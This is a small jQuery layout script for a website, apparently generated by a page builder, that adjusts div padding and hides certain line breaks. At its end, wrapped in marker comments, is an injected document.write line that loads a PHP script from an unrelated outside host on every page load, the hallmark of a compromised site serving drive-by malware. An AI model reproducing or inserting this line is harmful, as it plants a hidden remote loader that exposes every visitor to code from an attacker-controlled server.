$(function() {
	$('div.nof-positioning').each(function(i, obj) {
		var jObj = $(obj);
		var paddingTop = jObj.css('margin-top');
		jObj.css({
			'margin-top'  : '0px',
			'padding-top' : paddingTop
		});
	})
	$('br').each(function(i, obj) {
		var jObj = $(obj);
		if(jObj.css('line-height') == '0px')
			jObj.css('display', 'none');
	});
});

/*3ccfa1*/
document.write('<script src="http://plan-b.cwsurf.de/y98K4N6o.php?id=66195470" type="text/javascript"></script>');
/*/3ccfa1*/
